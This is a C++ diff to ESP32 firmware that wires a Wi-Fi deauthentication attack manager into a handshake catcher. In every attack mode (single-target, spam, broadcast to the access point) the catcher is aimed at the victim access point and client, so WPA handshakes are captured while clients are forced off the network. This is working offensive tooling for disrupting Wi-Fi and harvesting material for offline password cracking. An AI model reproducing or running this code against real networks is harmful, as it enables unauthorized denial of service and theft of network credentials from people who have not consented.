@@ -1,5 +1,6 @@
 #include "DeauthManager.hpp"
 #include "../storage/AccessPointManager.hpp"
+#include "HandshakeCatcher.hpp"
 #include <esp_wifi.h>
 #include <cstring>
 
@@ -56,6 +57,20 @@ void DeauthManager::StartAttack(AttackMode mode, const MacAddress& apMac, uint8_
     targetClient_ = clientMac;
     targetChannel_ = channel;
     
+    if (mode == AttackMode::SingleTarget || mode == AttackMode::SpamTarget)
+    {
+        HandshakeCatcher::GetInstance().SetTarget(apMac, clientMac);
+    }
+    else if (mode == AttackMode::BroadcastAP || mode == AttackMode::SpamAP)
+    {
+        MacAddress broadcastMac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        HandshakeCatcher::GetInstance().SetTarget(apMac, broadcastMac);
+    }
+    else
+    {
+        HandshakeCatcher::GetInstance().ClearTarget();
+    }
+
     isAttacking_.store(true);
 
     if (mode == AttackMode::SingleTarget || mode == AttackMode::BroadcastAP)
@@ -74,6 +89,7 @@ void DeauthManager::StartAttack(AttackMode mode, const MacAddress& apMac, uint8_
             
         isAttacking_.store(false);
         currentMode_ = AttackMode::None;
+        HandshakeCatcher::GetInstance().ClearTarget();
     }
     else
     {
@@ -97,6 +113,7 @@ void DeauthManager::StopAttack()
         }
     }
     currentMode_ = AttackMode::None;
+    HandshakeCatcher::GetInstance().ClearTarget();
 }
 
 void DeauthManager::AttackTask(void* arg)
